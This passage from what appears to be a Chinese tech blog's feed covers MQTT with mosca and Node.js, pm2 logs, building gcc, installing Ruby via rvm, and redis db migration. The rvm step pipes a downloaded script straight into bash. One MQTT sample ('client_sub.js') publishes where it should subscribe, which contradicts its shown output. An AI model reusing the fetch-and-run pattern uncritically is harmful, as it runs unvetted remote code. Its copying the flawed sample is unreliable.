<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.publish(<span style="color: #8abeb7;">'presence'</span>, <span style="color: #8abeb7;">'a message from myself'</span>);
}).on(<span style="color: #8abeb7;">'message'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">topic</span>, <span style="color: #f0c674;">message</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(topic + <span style="color: #8abeb7;">': '</span> + message.toString());
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.end();
});
</pre>
</div>

<p>
运行 <code>server.js</code>
</p>
<pre class="example">
$ node server.js
mosca server running
client(mqttjs_a423c0af) connected
client(internal) published topic($SYS/41TXEHPDe/new/clients): mqttjs_a423c0af
client(mqttjs_a423c0af) subscribed topic(presence)
client(internal) published topic($SYS/41TXEHPDe/new/subscribes): {"clientId":"mqttjs_a423c0af","topic":"presence"}
client(mqttjs_a423c0af) published topic(presence): a message from myself
client(mqttjs_a423c0af) unsubscribed topic(presence)
client(mqttjs_a423c0af) disconnected
client(internal) published topic($SYS/41TXEHPDe/new/unsubscribes): {"clientId":"mqttjs_a423c0af","topic":"presence"}
client(internal) published topic($SYS/41TXEHPDe/disconnect/clients): mqttjs_a423c0af
</pre>

<p>
运行 <code>client.js</code>
</p>
<pre class="example">
$ node client.js
presence: a message from myself
$ 
</pre></li>
</ul>
</div>
</div>

<div id="outline-container-orgca37166" class="outline-2">
<h2 id="orgca37166">客户端与客户端通信</h2>
<div class="outline-text-2" id="text-orgca37166">
<ul class="org-ul">
<li><p>
客户端发送消息给另一个客户端
</p>

<p>
下面的例子演示了客户端通过约定的 <code>topic</code> 互相通信。
</p>

<p>
<code>client_sub.js</code>
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">mqtt</span> = require(<span style="color: #8abeb7;">'mqtt'</span>);

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">client</span> = mqtt.connect(<span style="color: #8abeb7;">'mqtt://127.0.0.1:1883'</span>);
client.on(<span style="color: #8abeb7;">'connect'</span>, <span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.publish(<span style="color: #8abeb7;">'sub'</span>, <span style="color: #8abeb7;">'message from pub'</span>);
}).on(<span style="color: #8abeb7;">'message'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">topic</span>, <span style="color: #f0c674;">message</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(topic + <span style="color: #8abeb7;">': '</span> + message.toString());
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.end();
});
</pre>
</div>

<p>
<code>client_pub.js</code>
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">mqtt</span> = require(<span style="color: #8abeb7;">'mqtt'</span>);

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">client</span> = mqtt.connect(<span style="color: #8abeb7;">'mqtt://127.0.0.1:1883'</span>);
client.on(<span style="color: #8abeb7;">'connect'</span>, <span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.publish(<span style="color: #8abeb7;">'sub'</span>, <span style="color: #8abeb7;">'message from pub'</span>);
}).on(<span style="color: #8abeb7;">'message'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">topic</span>, <span style="color: #f0c674;">message</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(topic + <span style="color: #8abeb7;">': '</span> + message.toString());
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.end();
});
</pre>
</div>

<p>
运行 <code>server.js</code>
</p>
<pre class="example">
$ node server.js
mosca server running
client(mqttjs_ebdc9fd4) connected
client(internal) published topic($SYS/4Jk9PBwDe/new/clients): mqttjs_ebdc9fd4
client(mqttjs_ebdc9fd4) subscribed topic(sub)
client(internal) published topic($SYS/4Jk9PBwDe/new/subscribes): {"clientId":"mqttjs_ebdc9fd4","topic":"sub"}
client(mqttjs_ff000868) connected
client(internal) published topic($SYS/4Jk9PBwDe/new/clients): mqttjs_ff000868
client(mqttjs_ff000868) published topic(sub): message from pub
client(mqttjs_ebdc9fd4) unsubscribed topic(sub)
client(mqttjs_ebdc9fd4) disconnected
client(internal) published topic($SYS/4Jk9PBwDe/new/unsubscribes): {"clientId":"mqttjs_ebdc9fd4","topic":"sub"}
client(internal) published topic($SYS/4Jk9PBwDe/disconnect/clients): mqttjs_ebdc9fd4
</pre>

<p>
运行 <code>client_sub.js</code>
</p>
<pre class="example">
$ node client_sub.js
sub: message from pub
$ 
</pre>

<p>
运行 <code>client_pub.js</code>
</p>
<pre class="example">
$ node client_pub.js
</pre></li>
</ul>
</div>
</div>

<div id="outline-container-org27b312d" class="outline-2">
<h2 id="org27b312d">客户端与客户端离线通信</h2>
<div class="outline-text-2" id="text-org27b312d">
<p>
离线通信需要同时满足以下条件
</p>

<ul class="org-ul">
<li>服务器配置持久存储</li>

<li><p>
订阅方启用会话状态
</p>

<p>
连接服务器时使用同样的 clientId 并指定 <code>clean</code> 为 <code>false</code>
</p></li>

<li><p>
发布方发布持久消息
</p>

<p>
发布消息时指定 <code>qos</code> 大于 <code>0</code> 以及 <code>retain</code> 为 <code>true</code>
</p></li>
</ul>

<p>
下面的例子演示了客户端接收离线消息
</p>

<p>
<code>client_sub.js</code>
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">mqtt</span> = require(<span style="color: #8abeb7;">'mqtt'</span>);

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">client</span> = mqtt.connect(<span style="color: #8abeb7;">'mqtt://127.0.0.1:1883'</span>, {clientId: <span style="color: #8abeb7;">'sub'</span>, clean: <span style="color: #81a2be;">fals</span><span style="color: #81a2be; text-decoration: underline;">e</span><span style="text-decoration: underline;">});</span>
client.on(<span style="color: #8abeb7;">'connect'</span>, <span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.subscribe(<span style="color: #8abeb7;">'sub'</span>);
}).on(<span style="color: #8abeb7;">'message'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">topic</span>, <span style="color: #f0c674;">message</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(topic + <span style="color: #8abeb7;">': '</span> + message.toString());
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.end();
});
</pre>
</div>

<p>
<code>client_pub.js</code>
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">mqtt</span> = require(<span style="color: #8abeb7;">'mqtt'</span>);

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">client</span> = mqtt.connect(<span style="color: #8abeb7;">'mqtt://127.0.0.1:1883'</span>, {clientId: <span style="color: #8abeb7;">'pub'</span>});
client.on(<span style="color: #8abeb7;">'connect'</span>, <span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.publish(<span style="color: #8abeb7;">'sub'</span>, <span style="color: #8abeb7;">'message from pub'</span>, {qos: 1, retain: <span style="color: #81a2be;">true</span>});
}).on(<span style="color: #8abeb7;">'message'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">topic</span>, <span style="color: #f0c674;">message</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(topic + <span style="color: #8abeb7;">': '</span> + message.toString());
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.end();
});
</pre>
</div>

<p>
运行 <code>srever.js</code>
</p>
<pre class="example">
$ node mqtt_server.js
mosca server running
client(sub) connected
client(internal) published topic($SYS/V19OSVfix/new/clients): sub
client(sub) subscribed topic(sub)
client(internal) published topic($SYS/V19OSVfix/new/subscribes): {"clientId":"sub","topic":"sub"}
client(sub) disconnected
client(internal) published topic($SYS/V19OSVfix/disconnect/clients): sub
client(pub) connected
client(internal) published topic($SYS/V19OSVfix/new/clients): pub
client(pub) published topic(sub): message from pub
client(sub) connected
client(internal) published topic($SYS/V19OSVfix/new/clients): sub
client(sub) subscribed topic(sub)
client(internal) published topic($SYS/V19OSVfix/new/subscribes): {"clientId":"sub","topic":"sub"}
client(sub) disconnected
client(internal) published topic($SYS/V19OSVfix/disconnect/clients): sub
</pre>

<p>
运行 <code>client_sub.js</code> 订阅消息后退出
</p>
<pre class="example">
$ node client_sub.js 
sub: message from pub
$ 
</pre>

<p>
运行 <code>client_pub.js</code> 发布消息
</p>
<pre class="example">
$ node mqtt_client_pub.js 
</pre>

<p>
运行 <code>client_sub.js</code> 接收离线消息后退出
</p>
<pre class="example">
$ node client_sub.js 
sub: message from pub
$ 
</pre>
</div>
</div>

<div id="outline-container-orgde55858" class="outline-2">
<h2 id="orgde55858">参考</h2>
<div class="outline-text-2" id="text-orgde55858">
<p>
<a href="http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html">MQTT Version 3.1.1</a>
</p>

<p>
<a href="https://www.youtube.com/watch?v=WE7GVIFRV7Q">Matteo Collina: "MQTT" and "Node.js"- Messaging the Internet of Things </a>
</p>

<p>
<a href="http://thejackalofjavascript.com/getting-started-mqtt/">Getting started with MQTT | The Jackal of Javascript</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[pm2的日志管理]]></title>
            <link>/article/pm2-768465e55fd77ba17406.html</link>
            <guid>/article/pm2-768465e55fd77ba17406.html</guid>
            <pubDate>Wed, 17 Feb 2016 06:16:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
<a href="https://github.com/Unitech/pm2">pm2</a> 自身的日志文件 ~/.pm2/pm2.log，下面讲的是 <a href="https://github.com/Unitech/pm2">pm2</a> app（应用）的日志文件。
</p>

<div id="outline-container-org39090e4" class="outline-2">
<h2 id="org39090e4">默认日志</h2>
<div class="outline-text-2" id="text-org39090e4">
<p>
每个 app（应用） 会生成 instances*2 （实例数×2）个日志文件。
</p>

<dl class="org-dl">
<dt>app 的标准输出日志文件</dt><dd>~/.pm2/logs/&lt;app name&gt;-out-&lt;instance id&gt;.log</dd>

<dt>app 的错误输出日志文件</dt><dd>~/.pm2/logs/&lt;app name&gt;-error-&lt;instance id&gt;.log</dd>
</dl>
</div>
</div>

<div id="outline-container-org873b012" class="outline-2">
<h2 id="org873b012">合并输出类型日志（-l）</h2>
<div class="outline-text-2" id="text-org873b012">
<p>
每个 app（应用） 会生成 instances+1 （实例数+1）个日志文件。
</p>

<dl class="org-dl">
<dt>app 的日志文件</dt><dd>~/.pm2/logs/&lt;app name&gt;-&lt;instance id&gt;.log</dd>
</dl>

<p>
不影响默认日志。
</p>

<ul class="org-ul">
<li><p>
可以指定合并输出类型的日志文件名（-l app.log）
</p>

<p>
输出日志文件名为 app-&lt;instance id&gt;.log
</p></li>
</ul>
</div>
</div>

<div id="outline-container-orgeea4a9e" class="outline-2">
<h2 id="orgeea4a9e">合并实例日志（&#x2013;merge-logs）</h2>
<div class="outline-text-2" id="text-orgeea4a9e">
<p>
同一 app（应用）的所有 instances（实例）日志文件放在一起。
</p>

<dl class="org-dl">
<dt>app 的默认标准输出日志文件</dt><dd>~/.pm2/logs/&lt;app name&gt;-out.log</dd>

<dt>app 的默认错误输出日志文件</dt><dd>~/.pm2/logs/&lt;app name&gt;-error.log</dd>

<dt>app 的合并输出类型日志文件</dt><dd>~/.pm2/logs/&lt;app name&gt;.log</dd>
</dl>
</div>
</div>

<div id="outline-container-org787c6e9" class="outline-2">
<h2 id="org787c6e9">禁止默认日志</h2>
<div class="outline-text-2" id="text-org787c6e9">
<ul class="org-ul">
<li>禁止默认的标准输出日志文件（-o /dev/null）</li>

<li>禁止默认的错误输出日志文件（-e /dev/null）</li>
</ul>
</div>
</div>

<div id="outline-container-org9346253" class="outline-2">
<h2 id="org9346253">示例：app 生成一个日志文件简化日志管理</h2>
<div class="outline-text-2" id="text-org9346253">
<div class="org-src-container">
<pre class="src src-sh">pm2 -n app -i 0 -l app.log -o /dev/null -e /dev/null --merge-logs start app.js
</pre>
</div>

<p>
这样只会生成一个日志文件 app.log。
</p>
</div>
</div>

<div id="outline-container-orge24638e" class="outline-2">
<h2 id="orge24638e">定期清理日志</h2>
<div class="outline-text-2" id="text-orge24638e">
<p>
不建议使用 <a href="https://www.npmjs.com/package/pm2-logrotate">pm2-logrotate</a> ，太多问题了（详见： <a href="http://blog.kankanan.com/article/63a75236-pm2-768465e55fd765874ef659275c0f.html#sec-1">控制pm2的日志文件大小</a> ）。
</p>

<p>
还是使用 logrotate 服务靠谱（参考 <a href="http://pm2.keymetrics.io/docs/usage/log-management/#setting-up-a-native-logrotate">Setting up a native logrotate</a> <a href="http://huoding.com/2013/04/21/246">被遗忘的Logrotate | 火丁笔记</a>）：
</p>

<p>
<code>/etc/logrotate.d/pm2-root</code>
</p>
<pre class="example">
/root/.pm2/pm2.log /root/.pm2/logs/*.log {
    daily
    size 1M
    rotate 10
    create 600 nobody nobody
    missingok
    notifempty
    compress
    sharedscripts
    copytruncate
}
</pre>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[CentOS 6.4 上编译安装 gcc 5.2.0]]></title>
            <link>/article/centos-6.4-4e0a7f168bd15b8988c5-gcc-5.2.0.html</link>
            <guid>/article/centos-6.4-4e0a7f168bd15b8988c5-gcc-5.2.0.html</guid>
            <pubDate>Fri, 22 Jan 2016 13:12:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
node.js 4.x 的第三方扩展编译时要求 gcc 版本为 4.8，但是 CentOS 6.4 仓库里的版本为 4.4.7，
在生产环境从第三方仓库里安装最新版 gcc 又不放心，还是自已从源代码编译安装吧。
</p>

<ul class="org-ul">
<li><p>
下载 gcc 源代码
</p>

<div class="org-src-container">
<pre class="src src-sh">wget http://mirror.lzu.edu.cn/gnu/gcc/gcc-5.2.0/gcc-5.2.0.tar.bz2
tar xjvf gcc-5.2.0.tar.bz2
<span style="color: #b294bb;">cd</span> gcc-5.2.0
</pre>
</div>

<p>
官方的下载地址为 <a href="ftp://ftp.gnu.org/gnu/gcc/">ftp://ftp.gnu.org/gnu/gcc/</a> ，使用国内镜像 <a href="http://mirror.lzu.edu.cn/gnu/gcc">http://mirror.lzu.edu.cn/gnu/gcc</a> 快很多。
</p>

<p>
gnu 中国的 <a href="https://www.gnu.org/prep/ftp.html">镜像列表</a>
</p>
<blockquote>
<p>
Asia
</p>

<p>
China
    <a href="http://mirror.hust.edu.cn/gnu/">http://mirror.hust.edu.cn/gnu/</a>
    <a href="http://mirrors.ustc.edu.cn/gnu/">http://mirrors.ustc.edu.cn/gnu/</a>
    <a href="ftp://mirrors.ustc.edu.cn/gnu/">ftp://mirrors.ustc.edu.cn/gnu/</a>
    rsync://mirrors.ustc.edu.cn/gnu/
</p>
</blockquote></li>

<li><p>
安装依赖的包
</p>

<div class="org-src-container">
<pre class="src src-sh">yum install gmp-devel mpfr-devel libmpc-devel
</pre>
</div>

<p>
参考自 INSTALL 目录下的文档。
</p></li>

<li><p>
编译安装
</p>

<div class="org-src-container">
<pre class="src src-sh">./configure --prefix=/opt/gcc-5.2.0 --disable-multilib &amp;&amp;<span style="color: #8abeb7;">\</span>
make &amp;&amp;<span style="color: #8abeb7;">\</span>
make -k check &amp;&amp;<span style="color: #8abeb7;">\</span>
make install
</pre>
</div>

<p>
<code>--disable-multilib</code> 只编译 64 位。
</p>

<p>
编译时间会耗时几个小时，这段时间最好去干点别的。
</p></li>

<li><p>
切换gcc版本
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">export</span> <span style="color: #f0c674;">PATH</span>=/opt/gcc-5.2.0/bin:$<span style="color: #f0c674;">PATH</span>
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">LD_LIBRARY_PATH</span>=/opt/gcc-5.2.0/lib64/:$<span style="color: #f0c674;">LD_LIBRARY_PATH</span>
</pre>
</div>

<p>
或
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">export</span> <span style="color: #f0c674;">CC</span>=/opt/gcc-5.2.0/bin/gcc
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">CPP</span>=/opt/gcc-5.2.0/bin/cpp
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">CXX</span>=/opt/gcc-5.2.0/bin/c++
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">LD_LIBRARY_PATH</span>=/opt/gcc-5.2.0/lib64/:$<span style="color: #f0c674;">LD_LIBRARY_PATH</span>
</pre>
</div></li>

<li><p>
参考
</p>

<p>
<a href="http://superuser.com/questions/381160/how-to-install-gcc-4-7-x-4-8-x-on-centos">yum - How to Install gcc 4.7.x/4.8.x on CentOS - Super User</a>
</p>

<p>
<a href="https://wiki.mikejung.biz/Gcc_CentOS">Gcc CentOS - How to compile gcc-4.8.2 on CentOS 6.6</a></p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[CentOS 6.4 上安装 ruby 1.9.3]]></title>
            <link>/article/centos-6.4-4e0a5b8988c5-ruby-1.9.3.html</link>
            <guid>/article/centos-6.4-4e0a5b8988c5-ruby-1.9.3.html</guid>
            <pubDate>Fri, 22 Jan 2016 13:12:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
CentOS 6.4 上仓库中的 Ruby 版本为 1.8.7 太旧了，<a href="https://github.com/yaauie/redis-copy">redis-copy</a> 要求 Ruby 版本至少为 1.9.3。
</p>

<ul class="org-ul">
<li><p>
安装 rvm
</p>

<div class="org-src-container">
<pre class="src src-sh">curl -L get.rvm.io | bash -s stable
</pre>
</div></li>

<li><p>
安装 Ruby 1.9.3
</p>

<div class="org-src-container">
<pre class="src src-sh">/usr/local/rvm/bin/rvm install 1.9.3
</pre>
</div>

<ul class="org-ul">
<li><p>
启用 Ruby 1.9.3
</p>

<div class="org-src-container">
<pre class="src src-js">source /usr/local/rvm/scripts/rvm
rvm use 1.9.3
</pre>
</div></li>

<li><p>
安装 RubyGems
</p>

<div class="org-src-container">
<pre class="src src-sh">rvm rubygems current
</pre>
</div></li>

<li><p>
RubyGems 官方源国内访问不稳定，换成淘宝的镜像
</p>

<div class="org-src-container">
<pre class="src src-sh">gem sources --remove https://rubygems.org/
gem sources -a https://ruby.taobao.org/
</pre>
</div></li>

<li><p>
安装 <a href="https://github.com/yaauie/redis-copy">redis-copy</a>
</p>

<div class="org-src-container">
<pre class="src src-sh">gem install redis-copy
</pre>
</div>

<p>
安装后程序路径为 /usr/local/rvm/gems/ruby-1.9.3-p551/bin/redis-copy
</p>

<p>
启用 Ruby 1.9.3 后，redis-copy 可以直接运行。
</p></li>
</ul></li>

<li><p>
参考
</p>

<p>
<a href="https://www.digitalocean.com/community/tutorials/how-to-install-ruby-on-rails-on-centos-6-with-rvm">How To Install Ruby on Rails on CentOS 6 with RVM | DigitalOcean</a>
</p>

<p>
<a href="https://ruby-china.org/topics/3705">手把手安装RVM以及为什么RVM is not a function » Topics » Ruby China</a>
</p>

<p>
<a href="http://www.jb51.net/article/49079.htm">淘宝网提供的国内RubyGems镜像简介和使用方法_ruby专题_脚本之家</a></p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[迁移redis库的某个db]]></title>
            <link>/article/8fc179fb-redis-5e93768467d04e2a-db.html</link>
            <guid>/article/8fc179fb-redis-5e93768467d04e2a-db.html</guid>
            <pubDate>Thu, 21 Jan 2016 10:00:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在项目开始的时候，往往会把各种用途的数据放到一个 redis 实例中，如 db1 存放功能 A 的数据、db2 存放功能 B 的数据。
</p>

<p>
当 redis 的压力上来了之后，往往需要将某个 db 迁移到其它的实例上，如果是整个实例进行迁移，通常会通过 Master-Slave 将数据同步到新机器，然后提升新机器上的 redis 为 Master。
</p>

<p>
但是遇到只需要迁移 1 个 db 的数据到新的 redis 实例（该实例已有其它数据）的情况，就需要借助 redis 数据迁移工具了，这里介绍两个工具。
</p>

<p>
假设要将 redis 的 db5 从 192.168.1.100 上的 redis 迁到 192.168.1.101 上的 db5。
</p>

<div id="outline-container-org37debe5" class="outline-2">
<h2 id="org37debe5"><a href="https://github.com/salimane/redis-tools">redis-copy.py</a></h2>
<div class="outline-text-2" id="text-org37debe5">
<p>
使用 python 开发。
</p>

<ul class="org-ul">
<li><p>
安装
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo pip2 install redis
wget https://github.com/salimane/redis-tools/raw/master/redis-copy.py
</pre>
</div></li>

<li><p>
开始迁移
</p>

<div class="org-src-container">
<pre class="src src-sh">python2 ./redis-copy.py --source=192.168.1.100:6379 --target=192.168.1.101:6379 <span style="text-decoration: underline;">--databases=5 --limit=1000000000</span>
python2 ./redis-copy.py --source=192.168.1.100:6379 --target=192.168.1.101:6379 <span style="text-decoration: underline;">--databases=5 --clean</span>
</pre>
</div></li>
</ul>
</div>
</div>

<div id="outline-container-org1091113" class="outline-2">
<h2 id="org1091113"><a href="https://github.com/yaauie/redis-copy">redis-copy</a> （推荐）</h2>
<div class="outline-text-2" id="text-org1091113">
<p>
使用 ruby 开发。
</p>

<ul class="org-ul">
<li><p>
安装
</p>

<div class="org-src-container">
<pre class="src src-sh">gem install redis-copy
</pre>
</div></li>

<li><p>
开始迁移
</p>

<div class="org-src-container">
<pre class="src src-sh">~/.gem/ruby/2.3.0/bin/redis-copy 192.168.1.100:6379/5 192.168.1.101:6379/5
</pre>
</div></li>
</ul>
</div>
</div>

<div id="outline-container-org4d8bd0f" class="outline-2">
<h2 id="org4d8bd0f">比较</h2>
<div class="outline-text-2" id="text-org4d8bd0f">
<p>
<a href="https://github.com/salimane/redis-tools">redis-copy.py</a> 在迁移过程中 db 号不能改变，需要在源 db 中临时写入大量簿记信息，最终也没有完全清簿记信息（mig:run 键）。
默认一次运行迁移 10000 条记录，可以多次运行迁移后面的数据，也可以通过指定 &#x2013;limit 为一个够大的数量一次性迁移。
支持同时迁移多个 db 。
</p>

<p>
<a href="https://github.com/yaauie/redis-copy">redis-copy</a> 可以任意指定源、目的 db 号，不需要往 redis 写入簿记信息。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[mqtt协议一瞥]]></title>
            <link>/article/mqtt-534f8bae4e0077a5.html</link>
            <guid>/article/mqtt-534f8bae4e0077a5.html</guid>
            <pubDate>Tue, 05 Jan 2016 03:16:00 GMT</pubDate>
            <content:encoded><![CDATA[<blockquote>
<p>
IoT是Internet of Things的缩写，字面翻译是“物体组成的因特网”，准确的翻译应该为“物联网”。物联网(Internet Of Things)又称传感网，简要讲就是互联网从人向物的延伸。
</p>
</blockquote>
<p>
引用自 <a href="http://baike.baidu.com/subview/2831030/13489169.htm">IOT（物联网）_百度百科</a>
</p>


<blockquote>
<p>
MQTT is a machine-to-machine (M2M)/"Internet of Things" connectivity protocol. It was designed as an extremely lightweight publish/subscribe messaging transport. It is useful for connections with remote locations where a small code footprint is required and/or network bandwidth is at a premium. For example, it has been used in sensors communicating to a broker via satellite link, over occasional dial-up connections with healthcare providers, and in a range of home automation and small device scenarios. It is also ideal for mobile applications because of its small size, low power usage, minimised data packets, and efficient distribution of information to one or many receivers.
</p>
</blockquote>
<p>
引用自 <a href="http://mqtt.org/">mqtt.org</a>
</p>


<blockquote>
<p>
MQTT（Message Queuing Telemetry Transport，消息队列遥测传输）是IBM开发的一个即时通讯协议，有可能成为物联网的重要组成部分。
</p>
</blockquote>
<p>
引用自 <a href="http://baike.baidu.com/view/9956531.htm">MQTT_百度百科</a>
</p>


<blockquote>
<p>
MQTT is a lightweight messaging protocol that is based on publish/subscribe pattern. Due to its low overhead and simplicity, this protocol is suitable for use in IoT and M2M applications. 
</p>
</blockquote>
<p>
引用自 <a href="http://www.bitreactive.com/mqtt-request-response/">Request/Response Pattern Over MQTT | Bitreactive</a>
</p>


<blockquote>
<p>
MQTT - MQ Telemetry Transport
</p>

<p>
轻量级的 Machine-to-Machine 通信协议。
Publish/Subscribe模式。
基于TCP/IP。
支持QoS。
适合于低带宽、不可靠连接、嵌入式设备、CPU内存资源紧张。
是一种比较不错的Android消息推送方案。
FacebookMessenger采用了MQTT。
MQTT有可能成为物联网的重要协议。
</p>
</blockquote>
<p>
引用自 <a href="http://www.cnblogs.com/caca/p/mqtt.html">MQTT协议简记 - cacard - 博客园</a>
</p>

<blockquote>
<p>
Why MQTT?
</p>

<p>
It is a publish/subscribe protocol
It has Multiple Quality of Service levels (QOS)
It has at-least-once and exactly-once semantics
It has a low overhead (2 bytes at minimum)
It supports offline messaging
It retains messages, like a key/value store
</p>
</blockquote>
<p>
引用自 <a href="http://thejackalofjavascript.com/getting-started-mqtt/">Getting started with MQTT | The Jackal of Javascript</a>
</p>


<p>
<span class="underline">简言之， <code>mqtt</code> 就是简单高效基于 <code>发布/订阅</code> 的 <code>消息传输协议</code> ，主要用于资源受限设备（如：传感器、手机等）与服务器间有保障地进行消息或事件推送。</span>
</p>


<div id="outline-container-org5d59347" class="outline-2">
<h2 id="org5d59347">有一些人（或项目）在尝试将 <code>mqtt</code> 扩展到其它用途</h2>
<div class="outline-text-2" id="text-org5d59347">
<dl class="org-dl">
<dt>请求/响应模型（Request/Response）</dt><dd><a href="http://www.bitreactive.com/mqtt-request-response/">Request/Response Pattern Over MQTT | Bitreactive</a></dd>
</dl>


<dl class="org-dl">
<dt>远程过程调用（RPC）</dt><dd><a href="https://github.com/wolfeidau/mqtt-rpc">wolfeidau/mqtt-rpc</a></dd>
</dl>


<dl class="org-dl">
<dt>包裹WEB服务（REST）</dt><dd><a href="http://bytecontinnum.com/2014/12/consuming-mobile-apis-with-mqtt-reqres-pattern/">REST over MQTT for Constrained Devices/Mobiles | Prithiviraj Damodaran</a></dd>
</dl>
</div>
</div>


<div id="outline-container-orgab59b3d" class="outline-2">
<h2 id="orgab59b3d">IoT领域的其它竞争对手</h2>
<div class="outline-text-2" id="text-orgab59b3d">
<dl class="org-dl">
<dt><a href="https://tools.ietf.org/html/rfc7252">CoAP</a></dt><dd><p>
Constrained Applications Protocol
</p>

<p>
基于 <code>UDP</code> 协议，简化版的 <a href="https://tools.ietf.org/html/draft-ietf-httpbis-http2">HTTP/2</a> 。
</p>

<blockquote>
<p>
The Constrained Application Protocol (CoAP) is a specialized web transfer protocol for use with constrained nodes and constrained networks in the Internet of Things.
The protocol is designed for machine-to-machine (M2M) applications such as smart energy and building automation.
</p>
</blockquote>
<p>
引用自  <a href="http://coap.technology/">CoAP — Constrained Application Protocol</a>
</p></dd>
</dl>


<dl class="org-dl">
<dt><a href="https://tools.ietf.org/html/draft-ietf-httpbis-http2">HTTP/2</a></dt><dd><p>
HTTP/2 (originally named HTTP/2.0) is the second major version of the HTTP network protocol used by the World Wide Web
</p>

<p>
<a href="http://timkellogg.me/blog/2015/02/20/can-http2-replace-mqtt/">Can HTTP/2 Replace MQTT? - Tim Kellogg</a>
</p>

<p>
<a href="http://www.limmat.co/2015/02/18/http-2-the-new-iot-protocol/">HTTP/2 - The New IoT Protocol?</a>
</p>

<p>
<a href="http://robbysimpson.com/2015/01/26/http2-and-the-internet-of-things/">HTTP/2 and the Internet of Things</a>
</p>

<p>
<a href="https://systembash.com/mqtt-vs-websockets-vs-http2-the-best-iot-messaging-protocol/">MQTT vs Websockets vs HTTP/2: The Best IoT Messaging Protocol?</a>
</p>

<p>
<a href="http://webofthings.org/2015/10/25/http2-for-internet-of-things-1/">What’s in HTTP/2 for the Internet of Things? 1/2 | Web of Things</a>
</p></dd>
</dl>
</div>
</div>

<div id="outline-container-org04e0a99" class="outline-2">
<h2 id="org04e0a99">个人总结</h2>
<div class="outline-text-2" id="text-org04e0a99">
<p>
<a href="https://tools.ietf.org/html/draft-ietf-httpbis-http2">HTTP/2</a> 做为一种通用的应用层协议，由于被广泛部署，有着天然的优势，但是 <code>mqtt</code> 带来的 <code>Machine-To-Machine</code> 、 <code>offline</code> 、 <code>bridge</code>  消息传输，现在就可以应用到产品中。
</p>

<p>
或许将来有一天会出现构建于 <a href="https://tools.ietf.org/html/draft-ietf-httpbis-http2">HTTP/2</a> 上的类 <code>mqtt</code> 解决方案，它能够运行在绝大多数的资源内限嵌入式设备上，在这之前 <code>mqtt</code> 之类的成熟的应用层协议会有一席之地，特别是在它完美契合你的应用的情况下。
</p>

<p>
做为一个开发者，与其坐等完美的解决方案出现，还不如立即开始学习 <code>mqtt</code> ，应用 <code>mqtt</code> ，从 <code>mqtt</code> 中学到协议设计的经验与技术，以至成为实现构建于 <a href="https://tools.ietf.org/html/draft-ietf-httpbis-http2">HTTP/2</a> 上的类 <code>mqtt</code> 解决方案的那个人。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux下解决上网慢问题]]></title>
            <link>/article/archlinux-4e0b89e351b34e0a7f51616295ee9898.html</link>
            <guid>/article/archlinux-4e0b89e351b34e0a7f51616295ee9898.html</guid>
            <pubDate>Wed, 30 Dec 2015 02:17:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
发现  <code>Firefox</code> 的状态栏长时间显示 <code>Looking up www.xxxx.com ...</code> ，应该是我的电脑的 <code>DNS</code> 配置出问题了。
</p>

<p>
<code>/etc/resolv.conf</code> 内容如下：
</p>

<pre class="example">
# Generated by resolvconf
search lan
nameserver 8.8.8.8
nameserver 192.168.111.1
</pre>

<p>
<code>/etc/resolvconf.conf</code> 内容如下：
</p>

<pre class="example">
resolv_conf=/etc/resolv.conf
name_servers=8.8.8.8
</pre>

<p>
